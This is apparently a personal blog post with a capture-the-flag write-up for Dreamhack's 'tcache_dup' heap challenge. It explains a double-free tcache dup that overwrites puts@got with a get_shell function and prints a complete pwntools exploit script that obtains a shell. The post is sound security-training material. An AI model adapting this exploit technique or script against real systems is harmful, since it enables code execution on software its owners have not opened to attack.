+++
date = '2026-05-22'
draft = false
title = 'Dreamhack tcache_dup Writeup'
ShowToc = true
tags = ["Dreamhack", "pwn"]
+++


## Challenge overview
    
이 문제는 작동하고 있는 서비스(tcache_dup)의 바이너리와 소스코드가 주어집니다.
Tcache dup 공격 기법을 이용한 익스플로잇을 작성하여 셸을 획득한 후, "flag" 파일을 읽으세요.
"flag" 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
플래그의 형식은 DH{...} 입니다.


---

This is just a classic tcache dup.

```c
puts("1. Create");
    puts("2. Delete");
    printf("> ");
    __isoc99_scanf("%d", &v3);
    if ( v3 == 1 )
    {
      create(v4++);
    }
    else if ( v3 == 2 )
    {
      delete();
    }
```

## Identifying the vulnerabilities

Not only that, we also have a `get_shell` function provided for us.

And there are no double free protections at all in this version of libc.

So we can follow this action plan:

- malloc chunk A

- delete chunk A (tcache bins: `A`)

- delete chunk A (tcache bins: `A ⬅️ A`)

- malloc chunk (tcache bins: `A`, but we can write inside A now and modify its `fd` pointer)

- malloc chunk (tcache bins: `evil location`, since that's what A is pointing to)

- malloc chunk (will be allocated at `evil location`).

And we have partial RelRO so that evil location is going to be `puts@got` in this case.

That's about it!

![challenge-screenshot](flag.png#center)

## The exploit

```python
from pwn import *
elf =  ELF("./tcache_dup_patched")
libc = ELF("./libc.so.6")

context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:11267'

ip, port = cyberedu.split(':')
port = int(port)


if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    

#tcache dup = fastbin dup?
#ptr table bss 6010C0
#gdb.attach(p)

#create a
p.recvuntil(b"> ")
p.sendline(b"1")

#size
p.recvuntil(b": ")
p.sendline(b"24")

#data
p.recvuntil(b": ")
p.sendline(b"AAAA")


#free a
p.recvuntil(b"> ")
p.sendline(b"2")

p.recvuntil(b": ")
p.sendline(b"0")

#double free a direct merge; libc ver no verificare

#free a
p.recvuntil(b"> ")
p.sendline(b"2")

p.recvuntil(b": ")
p.sendline(b"0")

getshell = 0x400Ab0

#--------
#malloc a

p.recvuntil(b"> ")
p.sendline(b"1")

#size
p.recvuntil(b": ")
p.sendline(b"24")

#data
p.recvuntil(b": ")
p.send(p64(elf.got[b'puts']) + b"\x00"*16)

#we have getshell func
#overwrite puts@got with getshell

#malloc inside the 'a' chunk again, for its FD to become te next head

p.recvuntil(b"> ")
p.sendline(b"1")

#size
p.recvuntil(b": ")
p.sendline(b"24")

#data
p.recvuntil(b": ")
p.send(b"HI"*12)


#now head of tcache bins at puts

#--------
#malloc malicious

p.recvuntil(b"> ")
p.sendline(b"1")

#size
p.recvuntil(b": ")
p.sendline(b"24")

#data
p.recvuntil(b": ")
p.send(p64(getshell))

p.interactive()
```

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/tchache_dup.py)**.
